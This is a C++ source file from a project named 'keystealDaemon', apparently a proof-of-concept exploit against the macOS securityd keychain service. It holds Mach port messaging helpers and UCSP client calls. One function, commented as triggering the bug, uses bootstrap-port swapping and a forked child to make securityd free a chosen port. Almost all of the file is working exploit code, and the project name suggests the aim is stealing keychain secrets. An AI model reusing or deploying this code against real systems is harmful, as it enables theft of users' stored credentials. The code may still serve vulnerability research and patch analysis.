//
//  securityd.cpp
//  keystealDaemon
//
//  Created by Linus Henze on 21.01.19.
//  Copyright © 2019 Linus Henze. All rights reserved.
//

#include "securityd.hpp"

#define UCSP_ARGS    gServerPort, gReplyPort, &securitydCreds, &rcode
#define ATTRDATA(attr) (void *)(attr), (attr) ? strlen((attr)) : 0

#define CALL(func) \
    security_token_t securitydCreds; \
    CSSM_RETURN rcode; \
    if (KERN_SUCCESS != func) \
        return errSecCSInternalError; \
    if (securitydCreds.val[0] != 0) \
        return CSSM_ERRCODE_VERIFICATION_FAILURE; \
    return rcode

#define SSPROTOVERSION 20000

mach_port_t gServerPort;
mach_port_t gReplyPort;

mach_port_t recvPort(mach_port_t from) {
    struct {
        mach_msg_header_t          header;
        mach_msg_body_t            body;
        mach_msg_port_descriptor_t task_port;
        mach_msg_trailer_t         trailer;
    } msg;
    
    kern_return_t kr = mach_msg(&msg.header, MACH_RCV_MSG, 0, sizeof(msg), from, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        return MACH_PORT_NULL;
    }
    
    return msg.task_port.name;
}

mach_port_t recvPortWithReply(mach_port_t from, mach_port_t *client) {
    struct {
        mach_msg_header_t          header;
        mach_msg_body_t            body;
        mach_msg_port_descriptor_t task_port;
        mach_msg_trailer_t         trailer;
    } msg;
    
    kern_return_t kr = mach_msg(&msg.header, MACH_RCV_MSG, 0, sizeof(msg), from, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
        return MACH_PORT_NULL;
    }
    
    *client = msg.header.msgh_remote_port;
    
    return msg.task_port.name;
}

int sendPort(mach_port_t to, mach_port_t port) {
    struct {
        mach_msg_header_t          header;
        mach_msg_body_t            body;
        mach_msg_port_descriptor_t task_port;
    } msg;
    
    msg.header.msgh_remote_port = to;
    msg.header.msgh_local_port = MACH_PORT_NULL;
    msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    msg.header.msgh_size = sizeof(msg);
    
    msg.body.msgh_descriptor_count = 1;
    msg.task_port.name = port;
    msg.task_port.disposition = MACH_MSG_TYPE_COPY_SEND;
    msg.task_port.type = MACH_MSG_PORT_DESCRIPTOR;
    
    kern_return_t kr = mach_msg_send(&msg.header);
    if (kr != KERN_SUCCESS) {
        return 1;
    }
    
    return 0;
}

// Sends a port using MACH_MSG_TYPE_MAKE_SEND (must be a receive right)
int sendPortMake(mach_port_t to, mach_port_t port) {
    struct {
        mach_msg_header_t          header;
        mach_msg_body_t            body;
        mach_msg_port_descriptor_t task_port;
    } msg;
    
    msg.header.msgh_remote_port = to;
    msg.header.msgh_local_port = MACH_PORT_NULL;
    msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    msg.header.msgh_size = sizeof(msg);
    
    msg.body.msgh_descriptor_count = 1;
    msg.task_port.name = port;
    msg.task_port.disposition = MACH_MSG_TYPE_MAKE_SEND;
    msg.task_port.type = MACH_MSG_PORT_DESCRIPTOR;
    
    kern_return_t kr = mach_msg_send(&msg.header);
    if (kr != KERN_SUCCESS) {
        return 1;
    }
    
    return 0;
}

int sendPortReceiveRight(mach_port_t to, mach_port_t port) {
    struct {
        mach_msg_header_t          header;
        mach_msg_body_t            body;
        mach_msg_port_descriptor_t task_port;
    } msg;
    
    msg.header.msgh_remote_port = to;
    msg.header.msgh_local_port = MACH_PORT_NULL;
    msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    msg.header.msgh_size = sizeof(msg);
    
    msg.body.msgh_descriptor_count = 1;
    msg.task_port.name = port;
    msg.task_port.disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
    msg.task_port.type = MACH_MSG_PORT_DESCRIPTOR;
    
    kern_return_t kr = mach_msg_send(&msg.header);
    if (kr != KERN_SUCCESS) {
        return 1;
    }
    
    return 0;
}

CSSM_RETURN securityd_setup() {
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gReplyPort);
    mach_port_insert_right(mach_task_self(), gReplyPort, gReplyPort, MACH_MSG_TYPE_MAKE_SEND);
    bootstrap_look_up(bootstrap_port, (char*)"com.apple.SecurityServer", &gServerPort);
    ClientSetupInfo info = { 0x1234, SSPROTOVERSION };
    CALL(ucsp_client_setup(UCSP_ARGS, mach_task_self(), info, "?:unspecified"));
}

CSSM_RETURN securityd_setup_withport(mach_port_t port) {
    bootstrap_look_up(bootstrap_port, (char*)"com.apple.SecurityServer", &gServerPort);
    ClientSetupInfo info = { 0x1234, SSPROTOVERSION };
    CALL(ucsp_client_setup(gServerPort, port, &securitydCreds, &rcode, mach_task_self(), info, "?:unspecified"));
}

CSSM_RETURN securityd_mksession_withport(mach_port_t replyPort, mach_port_t task) {
    CALL(ucsp_client_setupThread(gServerPort, replyPort, &securitydCreds, &rcode, task));
}

CSSM_RETURN securityd_setup_hosting(mach_port_t port) {
    CALL(ucsp_client_registerHosting(UCSP_ARGS, port, 0));
}

// This triggers the bug and frees the passed-in port
CSSM_RETURN securityd_free_port(mach_port_t port) {
    mach_port_t bp;
    task_get_bootstrap_port(mach_task_self(), &bp);
    
    mach_port_t connection;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &connection);
    mach_port_insert_right(mach_task_self(), connection, connection, MACH_MSG_TYPE_MAKE_SEND);
    
    task_set_bootstrap_port(mach_task_self(), connection); // Magic ;)
    bootstrap_port = connection;
    
    pid_t pid = fork();
    if (pid == 0) {
        // Child, init connection then kill the port
        mach_port_t connection;
        task_get_bootstrap_port(mach_task_self(), &connection); // Might have a different name...
        
        // Create receive port and send to parent
        mach_port_t myPort;
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &myPort);
        mach_port_insert_right(mach_task_self(), myPort, myPort, MACH_MSG_TYPE_MAKE_SEND);
        sendPort(connection, myPort);
        
        // Get real bootstrap port
        bp = recvPort(myPort);
        bootstrap_port = bp;
        task_set_bootstrap_port(mach_task_self(), bp);
        
        // Get target port
        port = recvPort(myPort);
        
        // Now setup connection to securityd
        CSSM_RETURN cr = securityd_setup();
        if (cr != 0) {
            exit(cr);
        }
        
        // Free the port
        exit(securityd_setup_hosting(port));
    } else {
        // Parent
        task_set_bootstrap_port(mach_task_self(), bp);
        bootstrap_port = bp;
        
        // Get child port
        mach_port_t childPort = recvPort(connection);
        
        // Send bootstrap port
        sendPort(childPort, bp);
        
        // Send target port
        sendPort(childPort, port);
        
        // Now wait for the child to finish...
        int exitCode = 0;
        waitpid(pid, &exitCode, 0);
        
        mach_port_destroy(mach_task_self(), connection);
        
        return WEXITSTATUS(exitCode);
    }
}
